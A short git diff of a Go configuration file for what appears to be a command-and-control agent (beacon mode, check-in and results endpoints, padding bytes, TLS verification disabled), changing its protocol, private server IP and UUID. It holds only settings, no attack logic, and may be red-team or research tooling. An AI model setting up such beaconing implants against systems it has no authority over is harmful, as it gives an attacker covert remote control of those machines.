@@ -2,13 +2,13 @@
 package main
 
 import (
-	"github.com/faanross/numinon/internal/agent/config"
+	"numinon_shadow/internal/agent/config"
 	"time"
 )
 
 var embeddedAgentConfig = config.AgentConfig{
-	Protocol:          config.AgentProtocol("WS"),
-	ServerIP:          "192.168.2.249",
+	Protocol:          config.AgentProtocol("H1C"),
+	ServerIP:          "192.168.2.11",
 	ServerPort:        "8888",
 	CheckInEndpoint:   "/",
 	ResultsEndpoint:   "/results",
@@ -20,7 +20,7 @@ var embeddedAgentConfig = config.AgentConfig{
 	MinPaddingBytes:   64,
 	MaxPaddingBytes:   1024,
 	BeaconMode:        true,
-	UUID:              "9e6e2161-ce6e-4021-95f9-304b480ef9b7", // This will be the generated UUID pkg
+	UUID:              "bcf8e417-d135-42b7-a02c-fdba79a1af3a", // This will be the generated UUID pkg
 	SkipVerifyTLS:     true,
 }
 
